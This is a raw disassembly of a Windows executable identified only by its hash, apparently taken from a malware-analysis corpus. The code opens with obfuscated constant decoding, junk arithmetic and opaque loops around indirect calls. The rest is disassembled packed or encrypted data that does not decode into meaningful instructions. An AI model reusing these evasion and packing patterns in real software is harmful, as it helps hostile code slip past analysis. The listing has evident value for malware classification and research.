
69360eb44998762c481608e7d9fbaa6cb83a35759c7ea7e189519647adbb246c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0x3289c454
  40157e:	(bad)  
  40157f:	das    
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [ebx+ecx*4-0x76],edx
  401597:	mov    ecx,DWORD PTR [edx-0x1e2dd4d]
  40159d:	xchg   ecx,eax
  40159e:	test   eax,0x51987e88
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x225c06c4],0xa1
  40162d:	inc    esi
  40162e:	out    dx,eax
  40162f:	jecxz  0x40160f
  401631:	add    BYTE PTR [eax-0x3fa79106],0xca
  401638:	addr16 ja 0x40167a
  40163b:	push   ds
  40163c:	shl    BYTE PTR [esi+0x942424b],1
  401642:	imul   ebp,DWORD PTR [ebp+0x5ffcb26e],0x62
  401649:	inc    esi
  40164a:	push   ebx
  40164b:	sbb    DWORD PTR [esi+0x57],edx
  40164e:	xlat   BYTE PTR ds:[ebx]
  40164f:	fwait
  401650:	jl     0x4015f4
  401652:	push   ebx
  401653:	jno    0x40161c
  401655:	pop    edi
  401656:	push   0x13
  401658:	rcr    DWORD PTR [ebp+0x76],0xad
  40165c:	mov    esi,0x291cba10
  401661:	mov    esi,0xb23a88c
  401666:	jecxz  0x4016ce
  401668:	into   
  401669:	dec    eax
  40166a:	push   ecx
  40166b:	in     eax,dx
  40166c:	mov    edi,cs
  40166e:	aad    0x25
  401670:	rcl    DWORD PTR [edi+0x25],1
  401673:	(bad)  
  401675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401676:	pop    esp
  401677:	inc    esi
  401678:	pop    eax
  401679:	jns    0x401609
  40167b:	pop    ecx
  40167c:	xor    esp,eax
  40167e:	out    0x21,al
  401680:	add    edi,edx
  401682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401683:	cmp    al,0xee
  401685:	test   al,0xca
  401687:	adc    eax,0x98253611
  40168c:	lea    esp,[ecx-0x30816949]
  401692:	inc    edx
  401693:	rcl    DWORD PTR [ecx+eiz*1],1
  401696:	fcomp  DWORD PTR [edx]
  401698:	sub    al,0x8a
  40169a:	lock (bad) 
  40169c:	fdivr  QWORD PTR [eax+ecx*1]
  40169f:	push   0xffffffb0
  4016a1:	pop    esi
  4016a2:	mov    ebp,0x732913ad
  4016a7:	jnp    0x40167f
  4016a9:	and    bh,BYTE PTR [edi+0xe96a82]
  4016af:	(bad)  
  4016b0:	(bad)  
  4016b1:	cmp    al,ah
  4016b3:	cmp    al,0xb3
  4016b5:	cwde   
  4016b6:	lea    ebp,[bx+0x3ebe]
  4016bb:	ins    DWORD PTR es:[edi],dx
  4016bc:	cmp    al,0x77
  4016be:	in     al,0x45
  4016c0:	mov    ebp,0xf0afc386
  4016c5:	test   DWORD PTR [esi-0x16a2d3c3],eax
  4016cb:	mov    DWORD PTR ds:0x8c074724,eax
  4016d1:	test   eax,0xf477e490
  4016d6:	xchg   DWORD PTR [ecx+0x49f3f379],edx
  4016dc:	clc    
  4016dd:	into   
  4016de:	mov    edi,0x9639608d
  4016e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016e4:	dec    edi
  4016e5:	(bad)  
  4016e6:	and    BYTE PTR [eax-0x6b],dh
  4016e9:	inc    BYTE PTR [eax-0x235b083c]
  4016ef:	pop    edi
  4016f0:	push   ss
  4016f1:	xchg   BYTE PTR [bx+di+0xe0c],dh
  4016f6:	in     eax,0x9b
  4016f8:	or     al,0x37
  4016fa:	enter  0xd3e9,0x17
  4016fe:	addr16 add eax,0xf55072b0
  401704:	aad    0xa8
  401706:	rcl    BYTE PTR [ebx+0x54],1
  401709:	pusha  
  40170a:	popf   
  40170b:	dec    eax
  40170c:	add    al,BYTE PTR [edi]
  40170e:	popa   
  40170f:	cmp    BYTE PTR [ecx+0x6b],ch
  401712:	inc    DWORD PTR [edx+0x2094d604]
  401718:	test   al,0x2a
  40171a:	imul   dx,sp,0xff6e
  40171f:	xlat   BYTE PTR ds:[ebx]
  401720:	jo     0x40175f
  401722:	jb     0x4017a3
  401724:	(bad)  
  401725:	xor    dh,dl
  401727:	jp     0x4017a3
  401729:	lds    edi,FWORD PTR [eax-0x1195b328]
  40172f:	push   esp
  401730:	js     0x40179c
  401732:	ds xchg ecx,eax
  401734:	adc    dh,BYTE PTR [ecx+0x13]
  401737:	popf   
  401738:	dec    ecx
  401739:	push   ebp
  40173a:	adc    ah,dl
  40173c:	out    0xf3,eax
  40173e:	or     edi,edi
  401740:	div    DWORD PTR [eax]
  401742:	xchg   esi,eax
  401743:	sbb    ch,0xa5
  401746:	scas   al,BYTE PTR es:[edi]
  401747:	xor    edi,edx
  401749:	pop    esi
  40174a:	mov    ebx,0x53dd7962
  40174f:	aas    
  401750:	cmp    BYTE PTR [edx],dl
  401752:	enter  0xe80c,0x11
  401756:	dec    ebp
  401757:	dec    esi
  401758:	jle    0x40175d
  40175a:	jmp    0xe59c:0x216b5b45
  401761:	mov    edx,0xbebc226f
  401766:	inc    eax
  401767:	dec    ebx
  401768:	mov    edi,0x77f57a8
  40176d:	outs   dx,BYTE PTR ds:[esi]
  40176e:	aaa    
  40176f:	cmp    bl,bh
  401771:	add    ebp,DWORD PTR [ebp+0x5d]
  401774:	es aad 0x0
  401777:	mov    ebx,DWORD PTR [esi+0x1e]
  40177a:	aad    0xa2
  40177c:	rcr    DWORD PTR [eax],0xf7
  40177f:	sbb    ebx,ebp
  401781:	and    eax,0xcfcb7925
  401786:	aas    
  401787:	xchg   edi,eax
  401788:	ds jg  0x4017c6
  40178b:	out    0x2e,al
  40178d:	push   ds
  40178e:	ret    0x258a
  401791:	add    DWORD PTR [ebp+ecx*1-0x43],edx
  401795:	push   edi
  401796:	into   
  401797:	jmp    0x1799:0xae28bb4f
  40179e:	mov    al,ds:0x5bfc0586
  4017a3:	sbb    eax,0xbd788d5c
  4017a8:	pushf  
  4017a9:	das    
  4017aa:	neg    DWORD PTR [esi+0x4beac4b3]
  4017b0:	ins    BYTE PTR es:[edi],dx
  4017b1:	setne  ch
  4017b4:	out    0x1b,eax
  4017b6:	sbb    DWORD PTR [esi-0x34],eax
  4017b9:	mov    eax,ds:0xbf954934
  4017be:	xor    edx,ebp
  4017c0:	repz xchg ecx,eax
  4017c2:	pop    edx
  4017c3:	fcom   QWORD PTR ds:[esp+eax*8-0x20cf2904]
  4017cb:	iret   
  4017cc:	inc    esi
  4017cd:	lods   eax,DWORD PTR ds:[esi]
  4017ce:	(bad)  
  4017d0:	aas    
  4017d1:	call   0xcb17f723
  4017d6:	out    0x74,al
  4017d8:	in     eax,dx
  4017d9:	hlt    
  4017da:	xchg   DWORD PTR [esi+0x2b],ebx
  4017dd:	cmp    ecx,DWORD PTR [ecx+0x7b]
  4017e0:	add    BYTE PTR [edi+0x1f42139],bl
  4017e6:	retf   
  4017e7:	push   ecx
  4017e8:	lea    eax,[edi+0x0]
  4017eb:	(bad)  
  4017ec:	mov    ecx,0xd7261ae2
  4017f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017f2:	and    ecx,DWORD PTR [edi]
  4017f4:	sub    al,0xc
  4017f6:	sbb    edi,DWORD PTR [ebx-0x1502a8b]
  4017fc:	adc    ebx,DWORD PTR [ebp+eax*4+0x6ff80efb]
  401803:	nop
  401804:	inc    eax
  401805:	jbe    0x4017cb
  401807:	adc    ebx,edi
  401809:	push   eax
  40180a:	xor    ebx,DWORD PTR [esi+0x6c66d7ab]
  401810:	inc    ecx
  401811:	adc    bh,ah
  401813:	or     eax,0x35b8a12c
  401818:	mov    eax,ds:0x17384fd2
  40181d:	jecxz  0x40179f
  40181f:	out    0xea,eax
  401821:	mov    ah,0x23
  401823:	adc    al,0xc5
  401825:	mov    dl,0x7e
  401827:	test   DWORD PTR [edx+0x1c],ecx
  40182a:	stos   BYTE PTR es:[edi],al
  40182b:	mov    ah,0x86
  40182d:	and    al,0xa1
  40182f:	cmp    DWORD PTR [edi-0xec0ec2e],eax
  401835:	xchg   ebx,eax
  401836:	push   ss
  401837:	cli    
  401838:	sbb    cl,BYTE PTR [ebx-0x6a]
  40183b:	aam    0xa5
  40183d:	mov    esp,0xeea0b60a
  401842:	pushf  
  401843:	cmp    ah,0x28
  401846:	ss hlt 
  401848:	call   0x9ad1:0xaed56428
  40184f:	dec    ebx
  401850:	clc    
  401851:	ror    BYTE PTR [esi],0x85
  401854:	sbb    DWORD PTR [edi],eax
  401856:	xchg   DWORD PTR [ebx+0x7],edx
  401859:	or     ecx,esi
  40185b:	or     edi,esi
  40185d:	push   cs
  40185e:	and    eax,0x392a170b
  401863:	(bad)  
  401864:	mov    ebx,0xd96ee451
  401869:	or     eax,edx
  40186b:	test   eax,0x4f13e65b
  401870:	or     ecx,ecx
  401872:	int3   
  401873:	jmp    0x5942:0x887a1daa
  40187a:	and    eax,0x3eed2fd0
  40187f:	inc    ecx
  401880:	jno    0x40189d
  401882:	and    al,0xc3
  401884:	ficomp DWORD PTR [edx+0x4726b5cd]
  40188a:	lock pop es
  40188c:	jae    0x401846
  40188e:	pop    edi
  40188f:	pop    ecx
  401890:	cwde   
  401891:	stc    
  401892:	xchg   DWORD PTR [edi-0x6e],edi
  401895:	add    BYTE PTR [esi+esi*4-0x2232df84],ah
  40189c:	jmp    0xa014:0xbf40070b
  4018a3:	mov    bl,0x6b
  4018a5:	scas   eax,DWORD PTR es:[edi]
  4018a6:	pop    ebx
  4018a7:	data16 neg BYTE PTR [ecx+0x73]
  4018ab:	add    bl,BYTE PTR [ebx]
  4018ad:	sub    eax,0x72eda9bb
  4018b2:	sbb    cl,BYTE PTR [esi]
  4018b4:	xor    eax,0x3550149
  4018b9:	push   ecx
  4018ba:	(bad)  
  4018bb:	jl     0x40193a
  4018bd:	in     eax,0xa0
  4018bf:	aaa    
  4018c0:	sub    bh,BYTE PTR [edx+0xd]
  4018c3:	cmp    BYTE PTR [ebp+0x6f4a5569],bh
  4018c9:	pop    esi
  4018ca:	sbb    al,0xd9
  4018cc:	fistp  QWORD PTR [ebx+0x28]
  4018cf:	cwde   
  4018d0:	ins    DWORD PTR es:[edi],dx
  4018d1:	iret   
  4018d2:	or     BYTE PTR [eax+0x68c1f642],ch
  4018d8:	add    eax,0xb4be6fee
  4018dd:	lahf   
  4018de:	es aad 0x4f
  4018e1:	std    
  4018e2:	mov    edx,0xe62762c7
  4018e7:	xchg   edi,eax
  4018e8:	ins    BYTE PTR es:[edi],dx
  4018e9:	dec    ebx
  4018ea:	sub    eax,0x7d6eb9f3
  4018ef:	adc    bl,dh
  4018f1:	jbe    0x401928
  4018f3:	adc    BYTE PTR [esi+ebx*8+0x1ac5edc8],dh
  4018fa:	dec    ebx
  4018fb:	call   0x98f010e1
  401900:	jae    0x4018c0
  401902:	mov    cs,WORD PTR [ebx-0x5]
  401905:	ret    
  401906:	popa   
  401907:	mov    eax,ds:0x44a7f536
  40190c:	or     eax,0x2429f3b1
  401911:	jg     0x401965
  401913:	mov    cs,WORD PTR [eax]
  401915:	pushf  
  401916:	fistp  DWORD PTR [edx+0x2fb7f3a9]
  40191c:	fbld   TBYTE PTR [ecx-0x15]
  40191f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401920:	xchg   edx,eax
  401921:	sub    ch,BYTE PTR [edi+eax*1]
  401924:	pop    esp
  401925:	repnz add al,BYTE PTR [ecx]
  401928:	outs   dx,BYTE PTR ds:[esi]
  401929:	pop    esi
  40192a:	add    eax,0xa4035e5d
  40192f:	into   
  401930:	push   ss
  401931:	rcl    BYTE PTR ds:0x7a102035,0x93
  401938:	ins    BYTE PTR es:[edi],dx
  401939:	pop    ecx
  40193a:	jp     0x4019a3
  40193c:	imul   ebp,DWORD PTR [ebx-0x4c],0xffffffe3
  401940:	hlt    
  401941:	popa   
  401942:	pusha  
  401943:	dec    esp
  401944:	mov    ecx,0x64d9129
  401949:	xchg   ebx,eax
  40194a:	das    
  40194b:	mov    dh,0x42
  40194d:	test   eax,0xd89a1a59
  401952:	mov    al,ds:0x6ebaf602
  401957:	pop    ecx
  401958:	dec    ebx
  401959:	mov    esi,0x41201f79
  40195e:	sub    dh,BYTE PTR [ebx-0x6d836ce1]
  401964:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401966:	add    ebx,esp
  401968:	hlt    
  401969:	sub    dh,BYTE PTR [ecx+0x46b3aa7b]
  40196f:	inc    BYTE PTR [eax+0x6ee2e40]
  401975:	pop    ebp
  401976:	push   es
  401977:	jbe    0x40192d
  401979:	push   cs
  40197a:	mov    esi,0xeb3c3665
  40197f:	jo     0x4019bb
  401981:	cdq    
  401982:	and    esp,edi
  401984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401985:	jne    0x401994
  401987:	add    al,0x67
  401989:	pop    ebp
  40198a:	pop    ebx
  40198b:	inc    esp
  40198c:	pop    ss
  40198d:	inc    esi
  40198e:	push   ecx
  40198f:	adc    eax,0xd9aeb5fd
  401994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401995:	retf   
  401996:	fs xchg esp,eax
  401998:	jecxz  0x4019c3
  40199a:	fisub  WORD PTR [esi-0x68]
  40199d:	jle    0x40197c
  40199f:	push   0x41907626
  4019a4:	test   ah,dh
  4019a6:	leave  
  4019a7:	xor    eax,0xf9454ccb
  4019ac:	cld    
  4019ad:	mov    ds,WORD PTR [esi-0xa]
  4019b0:	ror    DWORD PTR [esi],1
  4019b2:	scas   al,BYTE PTR es:[edi]
  4019b3:	ja     0x401a14
  4019b5:	xchg   edi,eax
  4019b6:	out    0x77,al
  4019b8:	cli    
  4019b9:	mov    ebp,0x7e5de9bf
  4019be:	das    
  4019bf:	cs in  al,dx
  4019c1:	loopne 0x401a11
  4019c3:	xor    DWORD PTR [ebx-0x1836dd55],0xa50573c3
  4019cd:	cdq    
  4019ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019cf:	or     ah,BYTE PTR [ebp+edx*8-0x5187ce9f]
  4019d6:	ja     0x40195f
  4019d8:	test   eax,0x763a6184
  4019dd:	gs and eax,0x6a08c248
  4019e3:	pusha  
  4019e4:	ror    DWORD PTR [edi+0x1c],1
  4019e7:	cdq    
  4019e8:	and    bl,BYTE PTR [eax-0x795df665]
  4019ee:	lock inc DWORD PTR [esi+0x14]
  4019f2:	retf   
  4019f3:	in     al,dx
  4019f4:	test   al,0xa0
  4019f6:	nop
  4019f7:	test   eax,0xd1013da8
  4019fc:	mov    cl,0x8e
  4019fe:	retf   
  4019ff:	fcmovnbe st,st(3)
  401a01:	sar    BYTE PTR [ecx+0x6f379ebb],1
  401a07:	or     al,0x73
  401a09:	jo     0x40199d
  401a0b:	in     al,dx
  401a0c:	pop    esp
  401a0d:	sub    eax,0x5e0a5510
  401a12:	pop    ss
  401a13:	add    al,0x26
  401a15:	and    ch,dl
